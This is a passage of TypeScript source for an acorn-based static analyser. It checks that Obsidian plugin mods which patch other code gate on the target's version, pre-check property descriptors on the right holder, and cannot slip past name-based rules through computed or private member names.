     * Two graphs, deliberately. `flow` is **identity**: it is what proves a descriptor reached the
     * `.get`/`.set` test, and widening it would let a `.value` read stand in for that test. `vflow`
     * is **influence**, a superset, and is what the version gate asks — a version is a string, and a
     * gate mangles it on the way to the comparison. Sharing one graph is what made `const major =
     * Number(String(v).split(".")[0]); if (major < 1) return;` a false rejection.
     */
    const flow = new Map<string, Set<string>>();
    const vflow = new Map<string, Set<string>>();
    const testedForAccessor = new Set<string>();
    const versionSinks = new Set<string>();
    /**
     * A range check written **inside a helper** refuses the helper, not the install.
     *
     * `return d < 0 ? -1 : 1` inside a `cmpSemver` whose result is thrown away is a comparison that
     * changes nothing, and so is `inRange(v);` called as a bare statement — both were accepted as
     * gates. So a helper's internal comparison is held here and only becomes a sink once some call
     * site of that helper is itself in a refusing position, which is exactly what
     * `if (!inRange(v)) { …; return; }` is and what `const tooOld = cmpSemver(…) < 0;` is not.
     */
    const helperSinks: { fn: acorn.Function; sources: string[] }[] = [];
    const refusingCalls = new Set<acorn.Function>();
    const noteSink = (sources: string[], ancestors: readonly acorn.AnyNode[]): void => {
      const fn = enclosingFunction(ancestors);
      if (fn === null || fn === this.firstAroundFn) {
        for (const s of sources) versionSinks.add(s);
        return;
      }
      helperSinks.push({ fn, sources });
    };
    const versionNodes: {
      node: acorn.MemberExpression;
      method: string | null;
      fn: acorn.Function | null;
      start: number;
    }[] = [];
    const gateCandidates: { end: number; kind: 'direct' | 'method' | 'api'; name?: string }[] = [];
    const self = this;

    const vedge = (from: string, to: string): void => {
      let set = vflow.get(from);
      if (!set) {
        set = new Set();
        vflow.set(from, set);
      }
      set.add(to);
    };
    /** An identity edge is also an influence edge; the reverse is not true. */
    const edge = (from: string, to: string): void => {
      let set = flow.get(from);
      if (!set) {
        set = new Set();
        flow.set(from, set);
      }
      set.add(to);
      vedge(from, to);
    };

    /** Where a value came from, as flow-graph nodes. */
    const sourcesOf = (expr: acorn.AnyNode | null | undefined, scope: Scope, depth = 0): string[] => {
      if (!expr || depth > 8) return [];
      const inner = unwrapChain(expr);
      if (inner.type === 'CallExpression') {
        if (calleeName(inner.callee, consts) === 'getOwnPropertyDescriptor') return [`d:${inner.start}`];
        const fn = self.resolveCallee(inner, scope);
        if (fn) return [`f:${fn.start}`];
        return [];
      }
      if (inner.type === 'Identifier') {
        const b = self.lookup(inner.name, scope);
        return b ? [`v:${b.uid}`] : [];
      }
      if (inner.type === 'MemberExpression') {
        return versionNodes.some((v) => v.node === inner) ? [`ver:${inner.start}`] : [];
      }
      if (inner.type === 'LogicalExpression') {
        return [...sourcesOf(inner.left, scope, depth + 1), ...sourcesOf(inner.right, scope, depth + 1)];
      }
      if (inner.type === 'ConditionalExpression') {
        return [
          ...sourcesOf(inner.consequent, scope, depth + 1),
          ...sourcesOf(inner.alternate, scope, depth + 1),
        ];
      }
      if (inner.type === 'AwaitExpression') return sourcesOf(inner.argument, scope, depth + 1);
      return [];
    };

    /**
     * The same question for the version gate, asked as *influence* rather than as identity.
     *
     * A version is a string, and a gate mangles it on the way to the comparison —
     * `String(v).split(".")[0] >= "7"` compares something derived from the version, not the version.
     * The descriptor rule must stay identity-exact (a descriptor is an object, and "derived from"
     * would let a `.value` read stand in for a `.get` test), so this is a second, wider walk rather
     * than a loosening of the first.
     */
    const versionSourcesOf = (expr: acorn.AnyNode | null | undefined, scope: Scope, depth = 0): string[] => {
      if (!expr || depth > 10) return [];
      const inner = unwrapChain(expr);
      switch (inner.type) {
        case 'Identifier': {
          const b = self.lookup(inner.name, scope);
          return b ? [`v:${b.uid}`] : [];
        }
        case 'MemberExpression':
          return versionNodes.some((v) => v.node === inner)
            ? [`ver:${inner.start}`]
            : versionSourcesOf(inner.object, scope, depth + 1);
        case 'CallExpression': {
          const out: string[] = [];
          const callee = unwrapChain(inner.callee);
          const fn = self.resolveCallee(inner, scope);
          if (fn) out.push(`f:${fn.start}`);
          if (callee.type === 'MemberExpression') out.push(...versionSourcesOf(callee.object, scope, depth + 1));
          for (const a of inner.arguments) {
            if (a.type !== 'SpreadElement') out.push(...versionSourcesOf(a, scope, depth + 1));
          }
          return out;
        }
        case 'BinaryExpression':
        case 'LogicalExpression':
          return [
            ...versionSourcesOf(inner.left, scope, depth + 1),
            ...versionSourcesOf(inner.right, scope, depth + 1),
          ];
        case 'ConditionalExpression':
          return [
            ...versionSourcesOf(inner.consequent, scope, depth + 1),
            ...versionSourcesOf(inner.alternate, scope, depth + 1),
          ];
        case 'TemplateLiteral': {
          const out: string[] = [];
          for (const e of inner.expressions) out.push(...versionSourcesOf(e, scope, depth + 1));
          return out;
        }
        case 'AwaitExpression':
          return versionSourcesOf(inner.argument, scope, depth + 1);
        default:
          return [];
      }
    };

    // ── pass 1: find the measurements, so `sourcesOf` can recognise them ──
    walk.ancestor(this.program, {
      MemberExpression(node, _state, ancestors) {
        if (propertyName(node, consts) !== 'version') return;
        const scope = self.scopeFor(ancestors);
        const hostRooted =
          self.internalRooted.has(node) || isHostish(self.provOf(unwrapChain(node.object), scope));
        // `this.manifest.version` is the *mod's own* manifest and was accepted as a gate until
        // 2026-08-31. Only a host-rooted read is a reading of the target.
        if (!hostRooted) return;
        versionNodes.push({
          node,
          method: enclosingMethodName(ancestors, consts),
          fn: enclosingFunction(ancestors),
          start: node.start,
        });
      },
    });

    // ── pass 2: the flow edges, the sinks, and the subject bindings ──
    walk.ancestor(this.program, {
      VariableDeclarator(node, _state, ancestors) {
        if (node.id.type !== 'Identifier' || !node.init) return;
        const scope = self.scopeFor(ancestors);
        const b = self.lookup(node.id.name, scope);
        if (!b) return;
        for (const src of sourcesOf(node.init, scope)) edge(src, `v:${b.uid}`);
        // ⚠️ Influence, not identity: `const major = Number(String(v).split(".")[0])` carries the
        // version into `major` through three calls, and `sourcesOf` sees none of them.
        for (const src of versionSourcesOf(node.init, scope)) vedge(src, `v:${b.uid}`);
      },
      AssignmentExpression(node, _state, ancestors) {
        if (node.left.type !== 'Identifier') return;
        const scope = self.scopeFor(ancestors);
        const b = self.lookup(node.left.name, scope);
        if (!b) return;
        for (const src of sourcesOf(node.right, scope)) edge(src, `v:${b.uid}`);
        for (const src of versionSourcesOf(node.right, scope)) vedge(src, `v:${b.uid}`);
      },
      ReturnStatement(node, _state, ancestors) {
        const fn = enclosingFunction(ancestors);
        if (!fn || !node.argument) return;
        const scope = self.scopeFor(ancestors);
        for (const src of sourcesOf(node.argument, scope)) edge(src, `f:${fn.start}`);
        for (const src of versionSourcesOf(node.argument, scope)) vedge(src, `f:${fn.start}`);
      },
      MemberExpression(node, _state, ancestors) {
        const key = propertyName(node, consts);
        if (key !== 'get' && key !== 'set') return;
        const obj = unwrapChain(node.object);
        if (obj.type !== 'Identifier') return;
        // A `.get`/`.set` READ on a binding, which is what a real accessor pre-flight does.
        // ⚠️ `sawAccessorTest` used to be a file-global boolean that any `map.get(x)` satisfied.
        const parent = ancestors[ancestors.length - 2];
        if (parent?.type === 'CallExpression' && parent.callee === node) return;
        const b = self.lookup(obj.name, self.scopeFor(ancestors));
        if (b) testedForAccessor.add(`v:${b.uid}`);
      },
      ObjectPattern(node, _state, ancestors) {
        // `const { get, set } = desc` is the same test, written the other way.
        const parent = ancestors[ancestors.length - 2];
        if (parent?.type !== 'VariableDeclarator' || !parent.init) return;
        const keys = node.properties.some(
          (p) => p.type === 'Property' && p.key.type === 'Identifier' && (p.key.name === 'get' || p.key.name === 'set'),
        );
        if (!keys) return;
        const init = unwrapChain(parent.init);
        if (init.type !== 'Identifier') return;
        const b = self.lookup(init.name, self.scopeFor(ancestors));
        if (b) testedForAccessor.add(`v:${b.uid}`);
      },
      CallExpression(node, _state, ancestors) {
        const scope = self.scopeFor(ancestors);
        const name = calleeName(node.callee, consts);

        // helper call-arg paths, so a pre-flight in a helper nobody hands the holder to is dead
        let fnName: string | null = null;
        const callee = unwrapChain(node.callee);
        if (callee.type === 'Identifier') fnName = callee.name;
        else if (callee.type === 'MemberExpression' && unwrapChain(callee.object).type === 'ThisExpression') {
          fnName = propertyName(callee, consts);
        }
        if (fnName !== null) {
          const seen = callArgPaths.get(fnName) ?? [];
          for (const arg of node.arguments) {
            const p = self.canonicalPath(arg, scope);
            if (p !== null) seen.push(p);
          }
          callArgPaths.set(fnName, seen);
        }

        // A measurement handed to a helper keeps flowing. `if (!inRange(version)) { …; return; }`
        // does the comparison *inside* the helper, on its parameter — a perfectly ordinary gate,
        // and one that would be rejected outright without this edge.
        const target = self.resolveCallee(node, scope);
        if (target) {
          const params = self.paramBindings.get(target) ?? [];
          node.arguments.forEach((arg, i) => {
            const pb = params[i];
            if (!pb || arg.type === 'SpreadElement') return;
            for (const src of sourcesOf(arg, scope)) edge(src, `v:${pb.uid}`);
            // Influence only. A descriptor must reach its `.get`/`.set` test by identity; a version
            // may reach its range check through any amount of string mangling.
            for (const src of versionSourcesOf(arg, scope)) vedge(src, `v:${pb.uid}`);
          });
        }

        if (name === 'getOwnPropertyDescriptor') {
          descriptorCalls.push({
            start: node.start,
            holder: self.canonicalPath(node.arguments[0], scope),
            member: self.memberKeyOf(node.arguments[1], scope),
            inFn: enclosingFunctionName(ancestors),
          });
        }
        if (name === 'hasOwnProperty' || name === 'hasOwn') {
          const c = unwrapChain(node.callee);
          const subject = c.type === 'MemberExpression' ? unwrapChain(c.object) : null;
          shadowChecks.push(subject === null ? null : self.canonicalPath(subject, scope));
        }
        if (name === 'call' || name === 'apply') {
          const c = unwrapChain(node.callee);
          if (c.type === 'MemberExpression') {
            const inner = unwrapChain(c.object);
            if (inner.type === 'MemberExpression' && propertyName(inner, consts) === 'hasOwnProperty') {
              shadowChecks.push(self.canonicalPath(node.arguments[0], scope));
            }
          }
        }

        // ── version gate positions ──
        if (name === 'requireApiVersion' && isRefusingSink(ancestors)) {
          gateCandidates.push({ end: node.end, kind: 'api' });
        }
        const c2 = unwrapChain(node.callee);
        if (c2.type === 'MemberExpression' && unwrapChain(c2.object).type === 'ThisExpression') {
          const m = propertyName(c2, consts);
          if (m !== null) gateCandidates.push({ end: node.end, kind: 'method', name: m });
        }

        // A helper whose *result* is consumed in a refusing position really does gate — that is
        // what makes `if (!inRange(v)) { …; return; }` a gate and `inRange(v);` not one.
        if (target !== null && isRefusingSink(ancestors)) refusingCalls.add(target);

        // ── a version that reaches a RANGE comparison through a comparator call ──
        if (isRangeSink(ancestors)) {
          const sources: string[] = [];
          for (const arg of node.arguments) {
            if (arg.type === 'SpreadElement') continue;
            sources.push(...versionSourcesOf(arg, scope));
          }
          noteSink(sources, ancestors);
        }
      },
      BinaryExpression(node, _state, ancestors) {
        const scope = self.scopeFor(ancestors);
        const relational = RANGE_OPERATORS.has(node.operator);
        const equality = EQUALITY_OPERATORS.has(node.operator);
        if (!relational && !equality) return;
        for (const [side, other] of [
          [node.left, node.right],
          [node.right, node.left],
        ] as const) {
          // ⚠️ An equality against `null` is an EXISTENCE check, not a gate. n14 reproduced exactly
          // that: the target's version read, compared only to null, and `missing-version-gate`
          // stayed silent while an ungated patch installed.
          if (equality && staticStringValue(other, consts) === null) continue;
          if (!isRefusingSink(ancestors)) continue;
          noteSink(versionSourcesOf(side, scope), ancestors);
        }
      },
    });

    // A held helper sink becomes real once the helper is called from a refusing position.
    for (const h of helperSinks) {
      if (!refusingCalls.has(h.fn)) continue;
      for (const s of h.sources) versionSinks.add(s);
    }

    /* ── the accessor pre-flight, bound to its consequence ── */
    // The holder is whatever the mod installs on, `around()` or not — see {@link noteInstall}.
    const holderPath = this.installHolder
      ? this.canonicalPath(this.installHolder.node, this.installHolder.scope)
      : null;
    const specKeys = this.installMembers;
    const boundToHolder = (path: string | null): boolean =>
      path !== null && holderPath !== null && path === holderPath;
    const reached = (fn: string | null): boolean =>
      fn === null || (callArgPaths.get(fn) ?? []).some((p) => p === holderPath);

    this.hasAccessorPreflight = descriptorCalls.some(
      (d) =>
        boundToHolder(d.holder) &&
        reached(d.inFn) &&
        (d.member === null || specKeys.size === 0 || specKeys.has(d.member)) &&
        // ⚠️ THE CONSEQUENCE. A descriptor taken on the right holder for the right member and then
        // thrown away told the mod nothing. Reproduced at zero findings on 2026-08-31.
        reaches(flow, `d:${d.start}`, testedForAccessor),
    );

    // The shadow check is asked of the live *instance* the holder was derived from — `target` in
    // `const holder = target.constructor.prototype`. Comparing the whole canonical path rather than
    // its head is what keeps `hasOwnProperty.call({}, m)` and `hasOwnProperty.call(this.app.
    // workspace, m)` from both passing as "something rooted at `this`".
    const instancePath = stripPrototypeSuffix(holderPath);
    this.hasBoundShadowCheck = shadowChecks.some((s) => s !== null && s === instancePath);

    /* ── the version gate, bound to its consequence ── */
    const consequential = versionNodes.filter((v) => reaches(vflow, `ver:${v.start}`, versionSinks));
    const versionMethods = new Set(
      consequential.map((v) => v.method).filter((m): m is string => m !== null),
    );
    let gateEnd: number | null = null;
    const consider = (end: number): void => {
      if (gateEnd === null || end < gateEnd) gateEnd = end;
    };
    for (const v of consequential) {
      // A read taken in the same function as the patch gates where it is written. A read taken in a
      // *helper* gates at the call site instead — otherwise a version method declared earlier in the
      // file, and never called, would satisfy the rule on source position alone.
      if (v.fn === null || v.fn === this.firstAroundFn) consider(v.node.end);
    }
    for (const cand of gateCandidates) {
      if (cand.kind === 'method' && cand.name !== undefined && versionMethods.has(cand.name)) {
        consider(cand.end);
      }
      // A mod that never touches the plugin registry (plane A/B on Obsidian itself) has no target
      // manifest to read, so requireApiVersion IS its gate.
      //
      // ⚠️ `internalRooted.size === 0` was the whole test, and it is not the same question. A mod
      // that reaches its target through `this.app.workspace.getMostRecentLeaf().view.constructor
      // .prototype` never touches `app.plugins`, so the set stayed empty and a bare
      // requireApiVersion() satisfied the gate on a **third-party view class** — the version of
      // which Obsidian's API version says nothing at all. A prototype dug out of a live object is
      // never covered by requireApiVersion; `Workspace.prototype`, reached off the `obsidian`
      // import, is.
      if (cand.kind === 'api' && this.internalRooted.size === 0 && !this.patchesDerivedPrototype) {
        consider(cand.end);
      }
    }
    this.firstGateEnd = gateEnd;
  }

  /** The member name a pre-flight was asked about — a literal, or a const bound to one. */
  private memberKeyOf(node: acorn.AnyNode | undefined, scope: Scope): string | null {
    if (node === undefined) return null;
    const direct = staticStringValue(node, this.constStrings);
    if (direct !== null) return direct;
    const path = this.canonicalPath(node, scope);
    return path === null ? null : (this.constStrings.get(path) ?? null);
  }

}

function analyze(program: acorn.Program): Analysis {
  const a = new Analysis(program);
  a.build();
  return a;
}

/** Can a value at `from` reach any of `sinks` through the flow graph? */
function reaches(flow: ReadonlyMap<string, Set<string>>, from: string, sinks: ReadonlySet<string>): boolean {
  if (sinks.has(from)) return true;
  const seen = new Set<string>([from]);
  const queue = [from];
  while (queue.length > 0) {
    const cur = queue.pop();
    if (cur === undefined) continue;
    for (const next of flow.get(cur) ?? []) {
      if (seen.has(next)) continue;
      if (sinks.has(next)) return true;
      seen.add(next);
      queue.push(next);
    }
  }
  return false;
}

/**
 * Is this comparison (or comparator call) in a position whose failure path actually *refuses*?
 *
 * A gate that computes an answer and carries on is not a gate. This accepts a test inside an `if`
 * whose branch returns or throws, a conditional expression, and a predicate helper that returns the
 * comparison itself.
 */
function isRefusingSink(ancestors: readonly acorn.AnyNode[]): boolean {
  for (let i = ancestors.length - 1; i >= 0; i--) {
    const cur = ancestors[i];
    if (!cur) continue;
    if (cur.type === 'IfStatement') {
      return containsExit(cur.consequent) || (cur.alternate ? containsExit(cur.alternate) : false);
    }
    if (cur.type === 'ConditionalExpression') return true;
    // `return cmpSemver(v, FROM) >= 0;` — a predicate helper whose caller does the refusing.
    if (cur.type === 'ReturnStatement' || cur.type === 'ThrowStatement') return true;
    // The function boundary. A comparison that reaches it without passing through any of the above
    // computed an answer and carried on, which is not a gate.
    if (isFunctionNode(cur)) return false;
  }
  return false;
}

function containsExit(node: acorn.AnyNode): boolean {
  let found = false;
  walk.full(node, (child) => {
    if (child.type === 'ReturnStatement' || child.type === 'ThrowStatement') found = true;
  });
  return found;
}

/**
 * Is this call's result compared to a bound?
 *
 * `cmpSemver(version, VERSION_FROM) < 0` is how every generated mod gates, so the version reaches
 * its range check *through a comparator*. The call itself is not the sink; what is done with its
 * result is.
 */
function isRangeSink(ancestors: readonly acorn.AnyNode[]): boolean {
  const parent = ancestors[ancestors.length - 2];
  if (parent?.type === 'BinaryExpression' && RANGE_OPERATORS.has(parent.operator)) {
    return isRefusingSink(ancestors);
  }
  return false;
}

/* ────────────────────────────────────────────────────────────────────────────
 * AST helpers
 * ──────────────────────────────────────────────────────────────────────────── */

interface PositionedNode {
  start: number;
}

/** `this.<register*>(...)` — the only sanctioned acquisition form. */
function isRegisterCall(node: acorn.AnyNode): node is acorn.CallExpression {
  if (node.type !== 'CallExpression') return false;
  const callee = node.callee;
  return (
    callee.type === 'MemberExpression' &&
    !callee.computed &&
    callee.object.type === 'ThisExpression' &&
    callee.property.type === 'Identifier' &&
    REGISTER_METHODS.has(callee.property.name)
  );
}

/** Arguments that provably cannot be an uninstaller function. True positives only. */
function isNotCallable(arg: acorn.AnyNode): boolean {
  switch (arg.type) {
    case 'Literal':
    case 'TemplateLiteral':
    case 'ObjectExpression':
    case 'ArrayExpression':
      return true;
    default:
      return false;
  }
}

function unwrapChain(node: acorn.AnyNode): acorn.AnyNode {
  return node.type === 'ChainExpression' ? node.expression : node;
}

function propertyName(
  node: acorn.MemberExpression,
  consts?: ReadonlyMap<string, string>,
): string | null {
  if (!node.computed && node.property.type === 'Identifier') return node.property.name;
  // ⚠️ **THE LAST LATTICE CELL.** A `#private` property returned `null` here, and `null` is what
  // every caller reads as "not statically nameable". `resolveCallee` gave up, so `this.#holder()`
  // fell through to the branch where a call inherits its receiver — `this` is `owned`, so a private
  // helper that returns `target.constructor.prototype` handed back an **owned** host prototype and a
  // complete, contract-conformant mod validated at ZERO findings while permanently stubbing a method
  // on a plugin the user runs. A private name is perfectly static; it just is not an `Identifier`.
  // The `#` is kept in the key so it can never collide with a public member of the same name.
  if (!node.computed && node.property.type === 'PrivateIdentifier') return `#${node.property.name}`;
  if (node.computed) return staticStringValue(node.property, consts);
  return null;
}

/**
 * Fold a computed key back to a string when it is statically knowable.
 *
 * Without this, `el["add" + "Event" + "Listener"](…)` is a two-token evasion of every name-based
 * rule in the file. `consts` extends it one step further, to a `const` binding:
 * `const m = "add" + "EventListener"; activeDocument[m](…)` is a real, reproduced leak.
 */
function staticStringValue(node: acorn.AnyNode, consts?: ReadonlyMap<string, string>): string | null {
  const inner = unwrapChain(node);
  if (inner.type === 'Literal') return typeof inner.value === 'string' ? inner.value : null;
  if (inner.type === 'Identifier') return consts?.get(inner.name) ?? null;
  if (inner.type === 'TemplateLiteral') {
    if (inner.expressions.length > 0) return null;
    return inner.quasis.map((q) => q.value.cooked ?? q.value.raw).join('');
  }
  if (inner.type === 'BinaryExpression' && inner.operator === '+') {
    const left = staticStringValue(inner.left, consts);
    const right = staticStringValue(inner.right, consts);
    if (left === null || right === null) return null;
    return left + right;
  }
  return null;
}

/** The bare identifier or member-property name a call is made through, for name-based rules. */
function calleeName(callee: acorn.AnyNode, consts?: ReadonlyMap<string, string>): string | null {
  const inner = unwrapChain(callee);
  if (inner.type === 'Identifier') return inner.name;
  if (inner.type === 'MemberExpression') return propertyName(inner, consts);
  return null;
}

function calleeProperty(callee: acorn.AnyNode, consts?: ReadonlyMap<string, string>): string | null {
  const inner = unwrapChain(callee);
  return inner.type === 'MemberExpression' ? propertyName(inner, consts) : null;
}

/** A member chain written back out as `a.b.c`, or `null` when any hop is not statically nameable. */
function dottedPath(
  node: acorn.AnyNode | null | undefined,
  consts?: ReadonlyMap<string, string>,
): string | null {
  if (node === null || node === undefined) return null;
  const inner = unwrapChain(node);
  if (inner.type === 'Identifier') return inner.name;
  if (inner.type === 'ThisExpression') return 'this';
  if (inner.type === 'MemberExpression') {
    const base = dottedPath(inner.object, consts);
    if (base === null) return null;
    const prop = propertyName(inner, consts);
    if (prop === null) return null;
    return `${base}.${prop}`;
  }
  return null;
}

/** `a.b.constructor.prototype` → `a.b`: the live instance a prototype holder was derived from. */
function stripPrototypeSuffix(path: string | null): string | null {
  if (path === null) return null;
  if (path.endsWith('.constructor.prototype')) return path.slice(0, -'.constructor.prototype'.length);
  if (path.endsWith('.prototype')) return path.slice(0, -'.prototype'.length);
  return path;
}

/** The non-computed keys of an object literal — the members an `around()` spec actually wraps. */
function objectKeys(node: acorn.AnyNode | undefined, consts: ReadonlyMap<string, string>): Set<string> {
  const out = new Set<string>();
  if (node === undefined || unwrapChain(node).type !== 'ObjectExpression') return out;
  const obj = unwrapChain(node) as acorn.ObjectExpression;
  for (const prop of obj.properties) {
    if (prop.type !== 'Property') continue;
    if (prop.computed) {
      const folded = staticStringValue(prop.key, consts);
      if (folded !== null) out.add(folded);
      continue;
    }
    if (prop.key.type === 'Identifier') out.add(prop.key.name);
    else if (prop.key.type === 'Literal' && typeof prop.key.value === 'string') out.add(prop.key.value);
  }
  return out;
}

/** The class method a node sits inside, so `this.modkitTargetVersion()` resolves to its body. */
function enclosingMethodName(
  ancestors: readonly acorn.AnyNode[],
  consts: ReadonlyMap<string, string>,
): string | null {
  for (let i = ancestors.length - 1; i >= 0; i--) {
    const node = ancestors[i];
    if (!node) continue;
    if (node.type === 'MethodDefinition' || node.type === 'PropertyDefinition') {
      if (!node.computed && node.key.type === 'Identifier') return node.key.name;
      return staticStringValue(node.key, consts);
    }
  }
  return null;
}

/**
 * The nearest enclosing *named* function, or `null` when the node sits directly in a class method.
 *
 * This is what makes "the pre-flight was actually run" answerable: a `descriptorFor()` helper is
 * only a pre-flight if something hands it the holder.
 */
function enclosingFunctionName(ancestors: readonly acorn.AnyNode[]): string | null {
  for (let i = ancestors.length - 1; i >= 0; i--) {
    const node = ancestors[i];
    if (!node) continue;
    if (node.type === 'FunctionDeclaration') return node.id?.name ?? null;
    if (node.type === 'FunctionExpression' || node.type === 'ArrowFunctionExpression') {
      const parent = ancestors[i - 1];
      if (parent?.type === 'VariableDeclarator' && parent.id.type === 'Identifier') return parent.id.name;
      if (parent?.type === 'MethodDefinition' || parent?.type === 'PropertyDefinition') return null;
      continue; // an inline callback — keep looking outward for the function that owns it
    }
  }
  return null;
}

function enclosingFunction(ancestors: readonly acorn.AnyNode[]): acorn.Function | null {
  for (let i = ancestors.length - 1; i >= 0; i--) {
    const node = ancestors[i];
    if (node && isFunctionNode(node)) return node as acorn.Function;
  }
  return null;
}

/**
 * The **expression** a `new Observer(...)` or a frame request was bound to.
 *
 * Returns the node rather than its name, so the caller can ask {@link Analysis.reclaimKey} for its
 * identity. Returning a bare name is what let a `frame` cancelled in `onload()` also count as
 * cancelling an unrelated `frame` in another method.
 */
function boundTarget(ancestors: readonly acorn.AnyNode[]): acorn.AnyNode | null {
  for (let i = ancestors.length - 1; i >= 0; i--) {
    const node = ancestors[i];
    if (!node) continue;
    if (node.type === 'VariableDeclarator') {
      return node.id.type === 'Identifier' ? node.id : null;
    }
    if (node.type === 'AssignmentExpression') {
      const left = node.left;
      if (left.type === 'Identifier' || left.type === 'MemberExpression') return left;
      return null;
    }
  }
  return null;
}

/**
 * Past a `ChainExpression`, a parenthesis, and a **sequence expression**.
 *
 * `const s = (0, activeWindow.setInterval)` is the standard "call this without its receiver" idiom
 * and it stripped every rule that reads {@link Binding.member}, because `unwrapChain` stops at the
 * SequenceExpression.
 */
function unwrapValue(node: acorn.AnyNode): acorn.AnyNode {
  let cur = unwrapChain(node);
  for (let i = 0; i < 8; i++) {
    if (cur.type === 'SequenceExpression') {
      const last = cur.expressions[cur.expressions.length - 1];
      if (!last) return cur;
      cur = unwrapChain(last);
      continue;
    }
    if (cur.type === 'ParenthesizedExpression') {
      cur = unwrapChain((cur as unknown as { expression: acorn.AnyNode }).expression);
      continue;
    }
    return cur;
  }
  return cur;
}

/**
 * `X.m.bind(thisArg, …rest)` / `X.m.call` / `X.m.apply` — the method name and the baked-in arguments.
 *
 * `const on = activeDocument.addEventListener.bind(activeDocument)` is a raw listener whose name
 * appears nowhere near the call; `const put = Reflect.set.bind(null, hostProto)` is a host write
 * whose *target* appears nowhere near the call. Both returned zero findings.
 */
function detachedMethodOf(
  node: acorn.AnyNode,
  consts: ReadonlyMap<string, string>,
): { receiver: acorn.AnyNode; property: string | null; boundArgs: acorn.AnyNode[] } | null {
  const inner = unwrapValue(node);
  if (inner.type !== 'CallExpression') return null;
  const callee = unwrapChain(inner.callee);
  if (callee.type !== 'MemberExpression') return null;
  const wrapper = propertyName(callee, consts);
  if (wrapper !== 'bind' && wrapper !== 'call' && wrapper !== 'apply') return null;
  const inner2 = unwrapChain(callee.object);
  if (inner2.type !== 'MemberExpression') return null;
  const args: acorn.AnyNode[] = [];
  for (const a of inner.arguments.slice(1)) if (a.type !== 'SpreadElement') args.push(a);
  return {
    receiver: unwrapChain(inner2.object),
    property: propertyName(inner2, consts),
    boundArgs: wrapper === 'bind' || wrapper === 'call' ? args : [],
  };
}

/**
 * The function a factory hands back — `(next) => function (…a) { … }` and
 * `getTasks(next) { return function patched(…a) { … } }` are the same thing written twice.
 */
function returnedFunctionOf(fn: acorn.Function): acorn.Function | null {
  const body = fn.body;
  if (body.type !== 'BlockStatement') {
    const concise = unwrapValue(body);
    return isFunctionNode(concise) ? (concise as acorn.Function) : null;
  }
  let found: acorn.Function | null = null;
  for (const stmt of body.body) {
    if (stmt.type !== 'ReturnStatement' || !stmt.argument) continue;
    const inner = unwrapValue(stmt.argument);
    if (isFunctionNode(inner)) {
      if (found !== null) return null; // two different wrappers: not a shape worth judging
      found = inner as acorn.Function;
    }
  }
  return found;
}

function sameSubst(a: ReadonlyMap<string, string>, b: ReadonlyMap<string, string>): boolean {
  if (a.size !== b.size) return false;
  for (const [k, v] of a) if (b.get(k) !== v) return false;
  return true;
}

/**
 * Does `modkitProbe()` actually report anything?
 *
 * An empty body satisfied the rule by *name*, which is the ceremony the whole contract section
 * exists to refuse. A probe with no `return <expr>` cannot answer "did this observably apply?".
 */
function probeReports(fn: acorn.Function): boolean {
  const body = fn.body;
  if (body.type !== 'BlockStatement') return true; // a concise arrow is its own return
  let reports = false;
  walk.full(body, (child) => {
    if (child.type === 'ReturnStatement' && child.argument) reports = true;
  });
  return reports;
}

/**
 * A function whose value leaves the position we can see it called from. Its parameters can then be
 * anything, so they fail closed.
 */
function isEscapingFunction(node: acorn.AnyNode, ancestors: readonly acorn.AnyNode[]): boolean {
  const parent = ancestors[ancestors.length - 2];
  if (!parent) return true;
  switch (parent.type) {
    case 'VariableDeclarator':
      return false;
    case 'MethodDefinition':
    case 'PropertyDefinition':
      return false;
    case 'CallExpression':
    case 'NewExpression':
      // A callback the analysis models (forEach/map/then) still gets `unknown` joined in — join is
      // max, so a modelled host receiver still wins. This only ever adds conservatism.
      return parent.callee !== node;
    default:
      return true;
  }
}

/**
 * Whether an Identifier node is a *read of a binding* rather than a name in some other position —
 * a property name, an object key, a method name, an import/export specifier, a declaration id.
 */
function isIdentifierRead(node: acorn.Identifier, ancestors: readonly acorn.AnyNode[]): boolean {
  const parent = ancestors[ancestors.length - 2];
  if (!parent) return true;
  switch (parent.type) {
    case 'MemberExpression':
      return !(parent.property === node && !parent.computed);
    case 'Property':
      return !(parent.key === node && !parent.computed);
    case 'MethodDefinition':
    case 'PropertyDefinition':
      return !(parent.key === node && !parent.computed);
    case 'ImportSpecifier':
    case 'ImportDefaultSpecifier':
    case 'ImportNamespaceSpecifier':
    case 'ExportSpecifier':
      return false;
    case 'VariableDeclarator':
      return parent.id !== node;
    case 'FunctionDeclaration':
    case 'FunctionExpression':
    case 'ArrowFunctionExpression':
      return parent.id !== node && !parent.params.includes(node);
    case 'ClassDeclaration':
    case 'ClassExpression':
      return parent.id !== node;
    case 'LabeledStatement':
    case 'BreakStatement':
    case 'ContinueStatement':
      return false;
    default:
      return true;
  }
}

function isFunctionNode(node: acorn.AnyNode): boolean {
  return (
    node.type === 'FunctionDeclaration' ||
    node.type === 'FunctionExpression' ||
    node.type === 'ArrowFunctionExpression'
  );
}

function isScopeNode(node: acorn.AnyNode): boolean {
  switch (node.type) {
    case 'Program':
    case 'FunctionDeclaration':
    case 'FunctionExpression':
    case 'ArrowFunctionExpression':
    case 'BlockStatement':
    case 'StaticBlock':
    case 'ForStatement':
    case 'ForInStatement':
    case 'ForOfStatement':
    case 'CatchClause':
    case 'SwitchStatement':
      return true;
    default:
      return false;
  }
}

function nearestClassBefore(ancestors: readonly acorn.AnyNode[], before: number): acorn.Class | null {
  for (let i = Math.min(before, ancestors.length) - 1; i >= 0; i--) {
    const n = ancestors[i];
    if (n && (n.type === 'ClassDeclaration' || n.type === 'ClassExpression')) return n;
  }
  return null;
}

/**
 * Every `MemberExpression` a destructuring **assignment** target writes to.
 *
 * A declaration pattern only introduces names; an assignment pattern can write anywhere, and
 * `[h.getTasks] = [fn]` is `h.getTasks = fn` with the rule's one recognised node shape removed.
 */
function patternWriteTargets(pattern: acorn.AnyNode, out: acorn.AnyNode[] = [], depth = 0): acorn.AnyNode[] {
  if (depth > 12) return out;
  const node = unwrapChain(pattern);
  switch (node.type) {
    case 'MemberExpression':
      out.push(node);
      return out;
    case 'ArrayPattern':
      for (const el of node.elements) if (el) patternWriteTargets(el, out, depth + 1);
      return out;
    case 'ObjectPattern':
      for (const prop of node.properties) {
        if (prop.type === 'RestElement') patternWriteTargets(prop.argument, out, depth + 1);
        else patternWriteTargets(prop.value, out, depth + 1);
      }
      return out;
    case 'AssignmentPattern':
      return patternWriteTargets(node.left, out, depth + 1);
    case 'RestElement':
      return patternWriteTargets(node.argument, out, depth + 1);
    default:
      return out;
  }
}

/** Every name a binding pattern introduces, including destructuring, defaults and rest. */
